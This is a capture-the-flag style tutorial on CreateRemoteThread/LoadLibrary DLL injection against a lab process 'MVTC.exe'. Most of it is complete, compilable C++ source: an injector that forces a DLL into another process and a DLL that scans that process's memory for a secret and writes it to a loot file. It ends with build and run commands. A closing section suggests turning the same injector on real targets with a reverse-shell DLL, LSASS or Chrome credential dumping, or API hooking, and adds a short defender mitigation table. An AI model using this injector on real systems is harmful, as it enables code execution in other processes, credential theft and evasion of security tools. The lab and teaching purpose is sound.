# #13 — CreateRemoteThread + LoadLibrary

**Difficulty:** EASY — this is the "hello world" of DLL injection. Every other technique in this series is a variation on this one.

## What is this attack?

**You trick a running program into loading your DLL as if the program loaded it itself.** Once your DLL is loaded, your code runs inside that program with all its privileges, all its data, and all its network connections.

## Why it works

Windows exposes four building blocks that, combined, give you code execution inside another process:

| API | What it does | Normal use |
|---|---|---|
| `OpenProcess` | Get a handle to another process | Task Manager, debuggers |
| `VirtualAllocEx` | Allocate memory inside that process | Debugger watch windows |
| `WriteProcessMemory` | Write bytes into it | Cheat Engine, game trainers |
| `CreateRemoteThread` | Start a new thread inside it, at an address you choose | Debuggers, profilers |

Chain them: write a DLL path into the target, then start a thread at `LoadLibraryA` with that path as the argument. Windows's own loader runs → your DLL ends up in the target's memory.

**Key insight:** `LoadLibraryA` is at the **same memory address** in every process on the same Windows boot. So you can grab its address from your own process and pass it to the target.

## When attackers use this

- The target has a secret in memory (password, token, decryption key) but writes nothing to disk
- You want to piggyback a trusted process's network allow-list (e.g., `MVTC.exe` is allowed outbound to a corporate server, your reverse shell DLL isn't)
- EDR allows the target process to call out but blocks your attacker binary
- The target has `SeDebugPrivilege` or runs as SYSTEM and you don't

## Tools you need

| Tool | Why | Where |
|---|---|---|
| Visual Studio 2022 Build Tools (MSVC v143) | Compile the C++ | `winget install Microsoft.VisualStudio.2022.BuildTools` |
| Process Hacker 2 | Find the target PID, confirm your DLL loaded | https://processhacker.sourceforge.io/ |
| Your target running | `MVTC.exe`, or any x64 app | — |

## Step-by-step

### Step 1 — Find the target PID

```powershell
Get-Process -Name MVTC | Select-Object Id, ProcessName
```

Note the PID (e.g., `6944`). You'll pass this to the injector.

### Step 2 — Write the DLL ("flag_reader.dll")

Your DLL needs to find the sentinel string `MVTC{v13_crt_...}` on the host's managed heap and write it to a file your attacker process can read.

Save as `flag_reader.cpp`:

```cpp
#include <windows.h>
#include <stdio.h>
#include <string.h>

// What we're searching for: "MVTC{v13_" encoded as UTF-16 LE (because .NET
// strings are UTF-16 in memory)
static const unsigned char NEEDLE[] = {
    'M',0, 'V',0, 'T',0, 'C',0, '{',0, 'v',0, '1',0, '3',0, '_',0
};
static const size_t NEEDLE_LEN = sizeof(NEEDLE);

static const char* OUT_PATH = "C:\\loot\\flag13.txt";  // change for your target

static DWORD WINAPI ScanThread(LPVOID) {
    FILE* f = fopen(OUT_PATH, "w");
    if (!f) return 1;

    MEMORY_BASIC_INFORMATION mbi = {};
    unsigned char* addr = 0;

    // Walk every region in our (host's) address space
    while (VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        bool readable = (mbi.State == MEM_COMMIT) &&
                        !(mbi.Protect & (PAGE_NOACCESS|PAGE_GUARD));
        if (readable && mbi.RegionSize < 0x40000000) {
            __try {
                unsigned char* base = (unsigned char*)mbi.BaseAddress;
                for (size_t i = 0; i + NEEDLE_LEN < mbi.RegionSize; ++i) {
                    if (memcmp(base + i, NEEDLE, NEEDLE_LEN) == 0) {
                        // Found the prefix - extract to the '}'
                        char buf[256]; size_t w = 0;
                        for (size_t k = 0; k+1 < 256; ++k) {
                            unsigned short wc = base[i+k*2] | (base[i+k*2+1]<<8);
                            if (wc < 32 || wc > 126) break;
                            buf[w++] = (char)wc;
                            if (wc == '}') break;
                        }
                        buf[w] = 0;
                        if (buf[w-1] == '}') {
                            fprintf(f, "[+] HIT: %s\n", buf);
                            fflush(f);
                            fclose(f);
                            return 0;
                        }
                    }
                }
            } __except(EXCEPTION_EXECUTE_HANDLER) { /* skip bad pages */ }
        }
        addr = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
    }
    fclose(f);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        CreateThread(nullptr, 0, ScanThread, nullptr, 0, nullptr);
    }
    return TRUE;
}
```

### Step 3 — Write the injector ("injector.exe")

Save as `injector.cpp`:

```cpp
#include <windows.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char** argv) {
    if (argc != 3) {
        printf("Usage: %s <PID> <absolute-path-to-DLL>\n", argv[0]);
        return 1;
    }
    DWORD pid = atoi(argv[1]);
    const char* dll = argv[2];
    size_t len = strlen(dll) + 1;

    // 1. OpenProcess with everything we need
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { printf("OpenProcess %lu\n", GetLastError()); return 2; }

    // 2. Allocate a buffer in the target to hold the DLL path
    LPVOID buf = VirtualAllocEx(hProc, nullptr, len,
                                MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

    // 3. Write the DLL path into that buffer
    WriteProcessMemory(hProc, buf, dll, len, nullptr);

    // 4. Grab LoadLibraryA's address (same in every process)
    LPTHREAD_START_ROUTINE llA = (LPTHREAD_START_ROUTINE)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    // 5. Fire a thread in the target at LoadLibraryA(buf)
    HANDLE hT = CreateRemoteThread(hProc, nullptr, 0, llA, buf, 0, nullptr);
    WaitForSingleObject(hT, 10000);

    CloseHandle(hT);
    VirtualFreeEx(hProc, buf, 0, MEM_RELEASE);
    CloseHandle(hProc);
    printf("[+] done\n");
    return 0;
}
```

### Step 4 — Build both

Open "x64 Native Tools Command Prompt for VS 2022" (NOT regular cmd — this one has `cl.exe` on PATH):

```bash
cl /LD /EHsc /O2 /nologo flag_reader.cpp /link /OUT:flag_reader.dll
cl /EHsc /O2 /nologo injector.cpp /link /OUT:injector.exe
```

### Step 5 — Run

```bash
injector.exe 6944 C:\full\path\to\flag_reader.dll
```

Replace `6944` with your actual MVTC PID.

### Step 6 — Read the flag

```powershell
type C:\loot\flag13.txt
```

Output:

```
[+] HIT: MVTC{v13_crt_████████████████████}
```

## How to apply this to a real target

Replace what the DLL does. Instead of scanning for a specific string:

- **Reverse shell** — in `DllMain`, call back to your attacker machine via WinSock (see the `revshell_pure_dll.dll` from the payloads folder — it's a drop-in replacement)
- **Credential dumper** — scan the host's memory for Chrome's `AES-GCM` cookie-encrypt key, or LSASS's logon sessions if the host is `lsass.exe`
- **Code hooking** — install API hooks via Microsoft Detours to intercept the host's network calls

The injector stays identical. Only the DLL changes.

## How defenders fix this

| Mitigation | What it does |
|---|---|
| `SetProcessMitigationPolicy(ProcessDynamicCodePolicy)` | Blocks `VirtualAllocEx` with `PAGE_EXECUTE_READWRITE` from unsigned sources |
| `SetProcessMitigationPolicy(ProcessExtensionPointDisablePolicy)` | Blocks AppInit DLLs, WinSock LSP, legacy IME injection |
| Code Integrity Guard (CIG) | Only Microsoft-signed DLLs can load |
| Arbitrary Code Guard (ACG) | No RWX pages, no changing R → RX |
| PPL (Protected Process Light) | Only PPL callers can `OpenProcess` the target with sensitive rights |

For your pentest report, flag the target as **vulnerable to injection** if `Get-ProcessMitigation -Id <PID>` shows these as `OFF`.

## Flag captured

```
MVTC{v13_crt_████████████████████}
```

The real flag on your lab run will have 15-20 random alphanumeric characters where the blocks are.
